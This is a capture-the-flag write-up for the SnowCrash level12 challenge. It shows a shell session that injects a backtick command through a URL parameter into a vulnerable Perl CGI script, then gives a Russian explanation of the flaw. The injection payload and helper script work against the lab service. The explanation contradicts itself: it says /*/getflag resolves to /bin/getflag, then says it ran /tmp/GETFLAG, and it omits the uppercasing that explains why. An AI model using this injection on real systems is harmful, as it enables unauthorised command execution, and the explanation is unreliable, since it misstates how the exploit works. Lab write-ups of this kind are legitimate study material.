level12@SnowCrash:~$ echo "getflag > /tmp/token" > /tmp/GETFLAG
level12@SnowCrash:~$ cat /tmp/GETFLAG
getflag > /tmp/token
level12@SnowCrash:~$ chmod a+x /tmp/GETFLAG
level12@SnowCrash:~$ curl 'localhost:4646?x=`/*/getflag`'
..level12@SnowCrash:~$ cat /tmp/token
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr

как это работает

#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

Функция t($xx, $nn) — Проверяет файл /tmp/xd
sub t {
  $nn = $_[1];   # Второй аргумент
  $xx = $_[0];   # Первый аргумент
  $xx =~ tr/a-z/A-Z/;  # Переводит x в верхний регистр
  $xx =~ s/\s.*//;     # Удаляет всё после первого пробела
x — это параметр из запроса.
Преобразует x в верхний регистр.

@output = `egrep "^$xx" /tmp/xd 2>&1`;
Запускает egrep "^$xx" /tmp/xd
egrep ищет строки, начинающиеся с x в файле /tmp/xd.
Если команда выдаст ошибку, она перенаправляется (2>&1).

Если egrep нашёл строку вида FLAG12:some_value, проверяет, есть ли y во второй части.
Если есть — возвращает 1.
Если нет — возвращает 0.

Разбор уязвимости
В коде есть опасная строка:
@output = `egrep "^$xx" /tmp/xd 2>&1`;

Что здесь не так?
$xx — это непроверенный пользовательский ввод (значение параметра x из запроса).
Этот ввод вставляется прямо в команду оболочки:

egrep "^$xx" /tmp/xd

Если передать спецсимволы оболочки, например, бектики (`...`), то они будут выполнены как команда.

Как именно сработала команда?
Ты отправил запрос:
curl 'localhost:4646?x=`/*/getflag`'

Как Perl его интерпретировал?
egrep "^`/*/getflag`" /tmp/xd

\/*/getflag`` → выполнится как команда оболочки.

Команда getflag запустилась с правами flag12 (из-за SUID на level12.pl).

Результат команды getflag вставился внутрь egrep.

Ошибки редиректнулись в 2>&1, но сам getflag выполнился.

Но как getflag записал результат в /tmp/token?

Твой хитрый ход:
Ты создал скрипт /tmp/GETFLAG:

echo "getflag > /tmp/token" > /tmp/GETFLAG
chmod a+x /tmp/GETFLAG
А затем передал **x=\/*/getflag`**, который выполняет команду /tmp/GETFLAG`.

Почему /*/getflag?
Ты использовал маску /*/getflag, потому что:
/bin/getflag — это реальный путь к команде
/*/getflag — это хитрость, которая подбирает путь к getflag, обходя фильтры.

Таким образом:
Перл запустил оболочку и выполнил команду /tmp/GETFLAG.
Скрипт /tmp/GETFLAG запустил getflag и записал токен в /tmp/token.
